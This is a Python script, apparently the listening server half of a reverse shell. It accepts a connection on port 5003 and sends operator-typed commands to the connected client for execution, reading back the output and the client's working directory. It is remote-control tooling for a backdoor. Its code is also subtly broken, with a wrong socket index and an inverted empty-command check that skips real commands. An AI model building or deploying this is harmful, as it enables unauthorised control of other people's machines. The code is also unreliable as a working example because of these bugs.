import socket

#  all IPv4 IP addresses on local machine
server_host = "0.0.0.0"
server_port = 5003
# 128kb is the max size of messages and relatively easy to increas based on your choice
buffer_size = 1024 *128

# separator string for sending two messages at a go
separator = "<sep>"

# socket creation 
s = socket.socket()

# binding socket to all the IP Addresses of this host
s.bind((server_host, server_port))

# listening to connection
s.listen(5)
print(f'Listening as {server_host}:{server_port}')

# accepting any connections attempted 
client_socket, client_address = s.accept()
print(f'{client_address[0]}:{client_socket[1]} Connected!')

# recieving the current working directory of the client
cwd = client_socket.recv(buffer_size).decode()
print("[+] Current Working Directory: ", cwd)

while True:
    # getting the command from the prompt
    command = input(f'{cwd} $> ')
    if command.strip():
        # empty command 
        continue
    # send the comand to the client 
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        # if the command is exit, jut break out of the loop
        break
    # retrieving command results
    output = client_socket.recv(buffer_size).decode()
    results, cwd = output.split(separator)
    
    # print(results )
    